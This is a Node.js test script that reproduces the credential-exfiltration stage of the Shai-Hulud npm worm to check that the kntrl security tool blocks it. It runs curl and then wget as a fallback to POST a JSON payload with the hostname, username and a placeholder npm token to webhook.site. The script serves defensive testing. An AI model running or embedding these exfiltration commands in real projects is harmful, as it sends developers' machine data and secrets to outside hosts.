/**
 * Stage 2 — Exfiltration to webhook.site
 *
 * Shai-Hulud v1 exfiltrates stolen credentials to webhook.site via HTTP POST.
 * This was the primary exfil channel observed in the September 2025 campaign.
 *
 * kntrl detection:
 *   - Rego rule 1: blocks ANY process connecting to webhook.site (exfil domain blocklist)
 *   - YAML blocked_chains: blocks curl/wget spawned from npm ancestry
 *   - Process chain: npm → node → curl (blocked by eBPF + OPA)
 */

const { execSync } = require("child_process");

// Simulated stolen data (SAFE: no real credentials)
const payload = JSON.stringify({
  hostname: require("os").hostname(),
  user: process.env.USER || "unknown",
  simulation: true,
  npm_token: "npm_SIMULATED_NOT_A_REAL_TOKEN_1234567890",
  timestamp: new Date().toISOString(),
});

// --- Attempt 1: curl to webhook.site (Shai-Hulud v1 primary method) ---
console.log("  [exfil] Attempting exfil via curl → webhook.site ...");
try {
  execSync(
    `curl -s -m 5 -X POST -H "Content-Type: application/json" -d '${payload}' https://webhook.site/test-shai-hulud`,
    { stdio: "inherit", timeout: 8000 }
  );
  console.log("  [exfil] WARNING: curl to webhook.site succeeded (kntrl should have blocked this!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [exfil] curl killed by kntrl (SIGKILL) — process chain block working");
  } else {
    console.log("  [exfil] curl blocked or failed — expected behavior");
  }
}

// --- Attempt 2: wget fallback (worm tries multiple tools) ---
console.log("  [exfil] Attempting exfil via wget → webhook.site ...");
try {
  execSync(
    `wget -q -O- --timeout=5 --post-data='${payload}' https://webhook.site/test-shai-hulud`,
    { stdio: "inherit", timeout: 8000 }
  );
  console.log("  [exfil] WARNING: wget to webhook.site succeeded (kntrl should have blocked this!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [exfil] wget killed by kntrl (SIGKILL) — process chain block working");
  } else {
    console.log("  [exfil] wget blocked or failed — expected behavior");
  }
}
